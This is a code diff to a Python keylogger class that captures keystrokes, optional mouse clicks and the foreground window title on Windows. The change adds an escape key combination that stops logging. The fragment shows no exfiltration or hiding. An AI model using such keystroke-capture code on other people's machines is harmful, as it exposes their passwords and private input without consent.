@@ -2,11 +2,14 @@ import threading, pynput.keyboard, pynput.mouse
 
 from win32gui import GetWindowText, GetForegroundWindow
 
+KEY = pynput.keyboard.Key
 
 class keylogger:
-    def __init__(self, log_clicks=False):
+    def __init__(self, log_clicks=False, escape_combo=(KEY.shift, KEY.f1)):
         self.key_log = ""
         self.keylogger_running = False
+        self.key_combo = []
+        self.escape_combo = list(escape_combo)
         self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)
 
         self.log_clicks = log_clicks
@@ -45,6 +48,17 @@ class keylogger:
         else:
             self.key_log += str(event)[1:len(str(event)) - 1]  # remove quotes around
 
+        self.check_escape_char(event)
+
+    def check_escape_char(self, key):
+        self.key_combo.append(key)
+
+        if key != self.escape_combo[len(self.key_combo) - 1]:
+            self.key_combo = []
+        else:
+            if self.key_combo == self.escape_combo:
+                self.stop_key_logger()
+
     def on_click_event(self, x, y, button, pressed):
         current_window = GetWindowText(GetForegroundWindow())
 
@@ -52,5 +66,3 @@ class keylogger:
             self.window = current_window
             self.key_log += "\n" + "-" * 5 + f"{self.window}" + "-" * 5 + "\n"
 
-
-KEY = pynput.keyboard.Key
